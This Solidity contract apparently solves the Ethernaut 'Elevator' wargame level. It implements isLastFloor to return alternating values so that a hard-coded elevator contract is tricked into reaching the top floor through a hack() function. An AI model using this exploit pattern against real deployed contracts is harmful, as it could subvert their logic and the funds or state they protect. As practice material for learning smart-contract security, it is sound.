// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

interface IElevator {
  function goTo(uint) external;
}


contract MyBuilding is Building {

    IElevator elevator = IElevator(0xb27501F16FdF02bEa8cE6DbC6e6a108EF09EfCC9);
    bool public isLast = true;

    function isLastFloor(uint _floor) public override returns (bool) {
        isLast = !isLast;
        return isLast;
    }

    function hack() public {
        elevator.goTo(0);
    }
}